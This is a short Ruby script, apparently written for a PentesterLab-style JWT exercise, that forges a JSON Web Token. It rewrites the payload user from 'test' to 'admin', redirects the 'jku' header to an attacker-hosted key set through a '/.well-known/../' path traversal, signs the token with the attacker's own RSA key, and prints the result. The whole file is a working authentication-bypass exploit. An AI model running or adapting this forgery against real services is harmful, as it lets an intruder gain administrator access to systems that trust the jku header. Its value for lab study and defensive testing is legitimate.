require 'base64'
require 'openssl'

url = 'http://ptl-9eaa4a02-ac61e960.libcurl.so/da76f22c-578b-4718-9677-9e9092b90495.json'
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtOWVhYTRhMDItYWM2MWU5NjAubGliY3VybC5zby8ud2VsbC1rbm93bi8vandrcy5qc29uIn0.eyJ1c2VyIjoidGVzdCJ9.TBl_9EeUQLmrCXBTYFjtUlaBzkhu40i62WmJ-TDbuvSw9vZ8TVxRyWoe3gHQMnTENgc91r0v0FyQsaHrIbV1A9CF3wiDSCadYK2yxO63HHzUYiL95HHwP_KpNgF63wkY1JzpDyircL8DEWQi_9-2SsKjMU17gNsF31gBwQkE_md8b2RIRo9WzsMsybRV2QaY0pRq0xzlJRodt1jMuuMFTL5bojz4BxIOSoe8jdd0TVgqsYlVZVD4pkE7uwM8YHQMcivlYvVBTCBYvCI4CHbMPtXNbdcS2ZcHhOi2bfvzlshfniZlkdaq7A3wF_kFRQSLF-oJFGCgKMqF1PHDUXtQ5w'

header, payload, signature = token.split('.')
header = Base64.decode64(header)
payload = Base64.decode64(payload)

payload.gsub!("test", "admin")
header.gsub!("http://ptl-9eaa4a02-ac61e960.libcurl.so/.well-known//jwks.json", url)

token = Base64.urlsafe_encode64(header).gsub("=","") + "." + Base64.urlsafe_encode64(payload).gsub("=", "")

priv = OpenSSL::PKey::RSA.new File.read '../jwt8/private.pem'
pub = priv.public_key

sign = priv.sign("SHA256", token)
#puts token + "." + Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

#puts "Header:\n"+header+"\nPayload:\n"+payload
#puts Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")


##################
header = '{"typ":"JWT","alg":"RS256","jku":"http://ptl-9eaa4a02-ac61e960.libcurl.so/.well-known/../da76f22c-578b-4718-9677-9e9092b90495.json"}'
payload = '{"user":"admin"}'
token = Base64.urlsafe_encode64(header).gsub(/=+$/, "") + "." + Base64.urlsafe_encode64(payload).gsub(/=+$/, "")
sign = priv.sign("SHA256", token)
puts token + "." + Base64.urlsafe_encode64(sign).gsub(/=+$/,"")
